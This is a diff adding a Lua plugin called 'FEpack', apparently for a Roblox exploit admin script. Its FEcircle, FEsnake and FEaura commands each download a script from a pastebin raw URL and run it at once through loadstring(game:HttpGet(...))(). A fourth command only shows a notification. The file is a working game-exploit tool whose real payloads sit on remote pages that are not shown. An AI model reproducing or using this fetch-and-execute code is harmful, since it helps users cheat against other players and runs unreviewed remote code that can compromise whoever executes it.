@@ -1,0 +1,40 @@
+local Plugin = {
+    ["PluginName"] = "FEpack",
+    ["PluginDescription"] = "got FEsnake, FEaura and FEcircle",
+    ["Commands"] = {
+        ["FEcircle"] = {
+            ["ListName"] = "FEcircle",
+            ["Description"] = "FEcircle",
+            ["Aliases"] = {"","",""},
+            ["Function"] = function(args,speaker)
+				loadstring(game:HttpGet("https://pastebin.com/raw/ygwcfXck", true))()
+            end
+        },
+		["FEsnake"] = {
+            ["ListName"] = "FEsnake",
+            ["Description"] = "FEsnake",
+            ["Aliases"] = {"","",""},
+            ["Function"] = function(args,speaker)
+				loadstring(game:HttpGet('https://pastebin.com/raw/be06pAn6'))()
+		    end
+		},
+	    ["FEaura"] = {
+	        ["ListName"] = "FEaura",
+	        ["Description"] = "an aura",
+	        ["Aliases"] = {"","",""},
+	        ["Function"] = function(args,speaker)
+		        loadstring(game:HttpGet('https://pastebin.com/raw/ZPnRKXtv'))()
+	end
+},
+        ["notify"] = {
+            ["ListName"] = "notify [text]",
+            ["Description"] = "uses the notification function",
+            ["Aliases"] = {'alert'},
+            ["Function"] = function(args,speaker)
+                notify('Notification Title',getstring(1))
+            end
+        }
+    }
+}
+
+return Plugin
